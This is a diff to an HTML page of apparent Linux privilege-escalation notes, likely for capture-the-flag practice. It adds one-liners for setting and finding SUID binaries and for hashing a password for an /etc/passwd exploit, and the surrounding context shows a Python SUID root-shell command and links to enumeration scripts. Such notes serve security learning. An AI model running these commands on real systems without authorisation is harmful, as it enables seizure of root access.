@@ -143,6 +143,11 @@ Find this with any of these scripts:</p>
 <li><a href="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh">linpeas</a></li>
 <li><a href="https://raw.githubusercontent.com/knarkzel/linux-exploit-suggester/master/linux-exploit-suggester.sh">linux-exploit-suggester</a></li>
 </ul>
+<h2 id="useful-one-liners"><a class="header" href="#useful-one-liners">Useful one liners</a></h2>
+<pre><code class="language-bash">chmod u+s &lt;FILE&gt; # set SUID-bit
+find / -type f -perm -04000 -ls 2&gt;/dev/null # find SUID binaries
+openssl passwd -1 -salt THM &lt;PASSWORD&gt; # hash password for /etc/passwd exploit
+</code></pre>
 <h2 id="python-binary"><a class="header" href="#python-binary">Python binary</a></h2>
 <p>If you found a <code>python</code> binary with SUID, run following to become root:</p>
 <pre><code class="language-bash">python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
